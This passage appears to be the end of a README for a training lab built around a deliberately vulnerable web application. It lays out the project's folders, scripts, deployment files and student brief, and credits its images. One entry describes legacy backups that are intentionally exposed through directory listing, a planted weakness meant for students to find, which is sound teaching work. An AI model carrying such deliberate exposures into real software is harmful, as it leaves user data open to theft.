public/                   css, js, images, vendor (Bootstrap, icons, Chart.js, jQuery 1.12.4, fonts)
storage/backups/          intentionally listed legacy backups
storage/invoices/         generated PDF invoices
db/init.sql               schema, seed data, least-privilege DB user
k8s/                      namespace, secrets, MySQL, app, NetworkPolicy, kustomization
scripts/                  install-vm.sh, reset-lab.sh, verify_lab.py
Dockerfile, docker-compose.yml, .env, .env.example
ATTRIBUTIONS.md           image credits and licences
STUDENT_BRIEF.md          spoiler-free brief for students
```

Image credits: all photographs are from Wikimedia Commons under CC0, CC BY or CC BY-SA licences, credited in `ATTRIBUTIONS.md`.
